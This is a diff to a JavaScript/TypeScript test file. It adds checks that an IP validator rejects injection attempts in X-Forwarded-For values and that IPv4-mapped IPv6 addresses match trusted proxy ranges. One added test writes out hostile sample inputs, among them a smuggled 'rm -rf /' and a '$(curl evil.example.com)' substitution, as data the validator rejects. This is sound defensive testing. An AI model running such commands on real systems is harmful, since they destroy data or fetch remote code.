@@ -57,6 +57,15 @@ describe("isValidIp", () => {
 		expect(isValidIp("::1")).toBe(true);
 		expect(isValidIp("2001:db8::1")).toBe(true);
 	});
+
+	// L5: reject XFF values containing shell metacharacters or injection payloads.
+	test("rejects strings with shell metacharacters (L5)", () => {
+		expect(isValidIp("1.2.3.4; rm -rf /")).toBe(false);
+		expect(isValidIp("1.2.3.4|evil")).toBe(false);
+		expect(isValidIp("$(curl evil.example.com)")).toBe(false);
+		expect(isValidIp("1.2.3.4\n5.6.7.8")).toBe(false);
+		expect(isValidIp("1.2.3.4 5.6.7.8")).toBe(false);
+	});
 });
 
 describe("isTrustedProxy", () => {
@@ -83,6 +92,15 @@ describe("isTrustedProxy", () => {
 	test("IPv6 peer never matches IPv4 CIDR", () => {
 		expect(isTrustedProxy("::1", cidrs10)).toBe(false);
 		expect(isTrustedProxy("2001:db8::1", cidrs10)).toBe(false);
+	});
+
+	// L3: IPv4-mapped IPv6 addresses (::ffff:x.y.z.w) must match their embedded
+	// IPv4 address against trusted CIDRs so that a Traefik pod presenting the
+	// mapped form is still recognised as a trusted proxy.
+	test("IPv4-mapped IPv6 (::ffff:x.y.z.w) matches the embedded IPv4 CIDR (L3)", () => {
+		expect(isTrustedProxy("::ffff:10.42.0.1", cidrs10)).toBe(true);
+		expect(isTrustedProxy("::FFFF:10.0.0.1", cidrs10)).toBe(true);
+		expect(isTrustedProxy("::ffff:192.168.1.1", cidrs10)).toBe(false); // outside /8
 	});
 
 	test("empty CIDR list — nothing trusted", () => {
